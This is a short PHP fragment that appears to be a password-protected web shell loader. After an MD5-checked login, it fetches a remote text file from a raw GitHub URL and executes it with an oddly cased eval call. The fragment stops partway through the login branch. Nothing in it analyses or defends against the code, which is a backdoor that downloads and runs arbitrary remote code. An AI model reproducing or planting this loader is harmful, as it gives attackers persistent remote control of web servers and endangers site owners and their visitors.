...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/JakartaNews/berita/refs/heads/main/kiwkiw.txt');
    eVAl('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'f6acd9e07b3ad19d582ac867511f2ebd'; // Replace this with your MD5 hashed password
